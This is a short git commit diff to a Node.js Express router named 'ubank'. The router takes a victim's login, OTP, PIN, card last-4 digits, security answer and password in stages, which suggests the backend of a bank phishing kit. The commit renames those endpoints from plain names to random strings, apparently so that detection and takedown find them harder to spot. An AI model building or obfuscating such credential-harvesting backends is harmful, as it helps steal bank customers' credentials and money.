a9b6167ed2ce175e34c7a8644fb54eec6247751e
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2022-11-27 17:18:11 +0000

    make

--- routes/ubank.js
+++ routes/ubank.js
@@ -20,11 +20,11 @@ router.post("/command", command);
 router.get("/customers/id/:uniqueid", getInfo);
 router.post("/auwdoiuawdoih", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
-router.post("/otp", submitOtp);
-router.post("/pin", submitPin);
-router.post("/last4", submitLast4);
+router.post("/ccsecsdczx", submitOtp);
+router.post("/fwfawdqWD", submitPin);
+router.post("/fsgrewfdds", submitLast4);
 router.post("/delete", deleteEntry);
-router.post("/secAnswer", submitSecAnswer);
-router.post("/password", submitPassword);
+router.post("/hfuiiuhdad", submitSecAnswer);
+router.post("/fijweioufhs", submitPassword);
 
 module.exports = router;
